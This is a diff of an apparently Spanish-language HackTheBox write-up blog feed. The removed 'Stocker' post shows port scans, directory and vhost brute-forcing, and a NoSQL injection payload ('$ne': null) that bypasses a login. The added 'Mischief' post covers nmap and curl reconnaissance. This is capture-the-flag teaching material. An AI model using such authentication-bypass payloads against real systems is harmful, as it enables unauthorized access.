@@ -1,327 +1,438 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-02T15:06:21-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog | Writeups de HTB</title><subtitle>Blog de seguridad informatica</subtitle><author><name>VØ1DN3T</name></author><entry><title type="html">Stocker HackTheBox</title><link href="http://localhost:4000/writeup-stocker/" rel="alternate" type="text/html" title="Stocker HackTheBox" /><published>2023-03-12T00:00:00-03:00</published><updated>2023-03-12T00:00:00-03:00</updated><id>http://localhost:4000/writeup-stocker</id><content type="html" xml:base="http://localhost:4000/writeup-stocker/">&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox la cual está catalogada como easy, espero que disfruten del contenido.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-11T01:30:05+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog Ciberseguridad | Writeups</title><subtitle>Blog de Hacking Ofensivo</subtitle><author><name>Vo1dN3t</name></author><entry><title type="html">Mischeif HackTheBox</title><link href="http://localhost:4000/writeup-Mischeif/" rel="alternate" type="text/html" title="Mischeif HackTheBox" /><published>2023-11-10T00:00:00+00:00</published><updated>2023-11-10T00:00:00+00:00</updated><id>http://localhost:4000/writeup-Mischeif</id><content type="html" xml:base="http://localhost:4000/writeup-Mischeif/">&lt;p&gt;Buenas a todos, en esta ocasión resolveremos una máquina Linux llamada “Mischief” la cual está catalogada como insane en la plataforma de HackTheBox.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/Stocker.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/mischief.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Empezamos a escanear para descubrir puertos abiertos en la máquina&lt;/p&gt;
+&lt;hr /&gt;
 
-&lt;p&gt;Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.&lt;/p&gt;
+&lt;p&gt;Primero empezamos a escanear con Nmap para ver que puertos tiene abiertos.&lt;/p&gt;
 
-&lt;p&gt;Empezamos a escanear para decubrir puertos abiertos en la máquina&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.92 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allports
+Starting Nmap 7.94SVN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-11-10 20:31 GMT
+Initiating SYN Stealth Scan at 20:31
+Scanning 10.10.10.92 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 22/tcp on 10.10.10.92
+Stats: 0:00:15 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 57.46% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 20:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:12 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Discovered open port 3366/tcp on 10.10.10.92
+Completed SYN Stealth Scan at 20:31, 26.54s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.92
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2023-11-10 20:31:19 GMT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65533 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT     STATE SERVICE        REASON
+22/tcp   open  ssh            syn-ack ttl 63
+3366/tcp open  creativepartnr syn-ack ttl 63
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.196
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;&apos;up&apos;&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:37 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
-Initiating SYN Stealth Scan at 21:37
-Scanning 10.10.11.196 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.11.196
-Discovered open port 80/tcp on 10.10.11.196
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196 from 0 to 5 due to max_successful_tryno increase to 4
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196 from 5 to 10 due to max_successful_tryno increase to 5
-Completed SYN Stealth Scan at 21:37, 16.48s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2023-03-12 21:37:28 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;17s
-Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.65 seconds
+           Raw packets sent: 131085 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;836B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Luego seguimos con el escaneo de puertos para ver qué versiones y servicios tiene&lt;/p&gt;
+&lt;p&gt;Sigamos con el escaneo de puertos.&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.11.196
-Starting Nmap 7.93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-03-12 21:47 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.11.196
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,3366 10.10.10.92 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.94SVN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-11-10 20:35 GMT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.92
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | ssh-hostkey: 
-|   3072 3d12971d86bc161683608f4f06e6d54e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 7c4d1a7868ce1200df491037f9ad174f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 dd978050a5bacd7d55e827ed28fdaa3b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Did not follow redirect to http://stocker.htb &amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3366/tcp open  caldav  Radicale calendar and contacts server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python BaseHTTPServer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+| http-auth: 
+| HTTP/1.0 401 Unauthorized&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D
+|_  Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Test
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Vemos que nmap en el puerto 80 nos reportó un dominio, otra forma para descubrir el dominio es tirando de curl&lt;/p&gt;
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Si miramos bien, en el puerto 3366 nos llevará a una página que nos pedirá unas credenciales:&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.10.11.196 &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Location
-Location: http://stocker.htb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ya que tenemos un dominio es tan solo agregarlo en el archivo /etc/hosts&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/puerto3366.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-127.0.0.1       localhost
-127.0.1.1       voidnet
-10.10.11.196 stocker.htb
-&lt;span class=&quot;c&quot;&gt;# The following lines are desirable for IPv6 capable hosts&lt;/span&gt;
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Revisemos la web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pagina.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora que tenemos un dominio intentemos buscar directorios ocultos con gobuster&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100
-
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-Gobuster v3.5
-by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://stocker.htb
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 100
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.5
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-2023/03/12 22:07:03 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-/img                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/img/]
-/css                  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/css/]
-/js                   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/js/]
-/fonts                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 178] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; http://stocker.htb/fonts/]
-Progress: 9028 / 220561 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.09%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;^C
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
-
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-2023/03/12 22:07:20 Finished
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Podemos ver que nos reportó un directorio llamado fonts, veamos con qué nos encontramos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/direc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que no hay nada, intentemos buscar subdirectorios&lt;/p&gt;
+&lt;p&gt;Si lanzamos un curl podemos ver que en la web corre un SimpleHTTPServer usando la versión de Python 2.7.15rc1&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
- gobuster vhost &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://stocker.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--no-error&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-Gobuster v3.5
-by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:             http://stocker.htb
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:          GET
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:         100
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:      gobuster/3.5
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:         10s
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-2023/03/12 22:15:04 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;VHOST enumeration mode
-&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
-Found: dev.stocker.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 28]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Encontramos un subdominio, ahora es tan solo agregarlo al /etc/hosts&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;10.10.11.196 dev.stocker.htb&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
+❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.92:3366&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;
+HTTP/1.0 401 Unauthorized
+Server: SimpleHTTP/0.6 Python/2.7.15rc1
+Date: Fri, 10 Nov 2023 20:49:20 GMT
+WWW-Authenticate: Basic &lt;span class=&quot;nv&quot;&gt;realm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Test&quot;&lt;/span&gt;
+Content-type: text/html
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ingresemos a la web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intentos con BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli&lt;/p&gt;
-
-&lt;p&gt;Al interceptar por BurpSuite nos muestra esto&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-POST /login HTTP/1.1
-
-Host: dev.stocker.htb
-
-User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:102.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/102.0
-
-Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
-
-Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
-
-Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
-
-Content-Type: application/x-www-form-urlencoded
-
-Content-Length: 29
-
-Origin: http://dev.stocker.htb
-
-Connection: close
-
-Referer: http://dev.stocker.htb/login
-
-Cookie: connect.sid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s%3AeehRhX_wEYQcXzjWxltuGkOJ0T8tYaa_.iO7JxTfBZdxcPOUdjeU3uGBLRc9P4jRifl0bGfz0Jx8
-
-Upgrade-Insecure-Requests: 1
-
-
-&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;admin
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora para hacer el ataque NoSqli tenemos que ejecutar donde está el apartado username=admin…. con este script&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;: null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ne&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;: null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Pero antes donde dice content-Type tenemos que poner esto&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;application/json
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y nos quedaría algo así&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
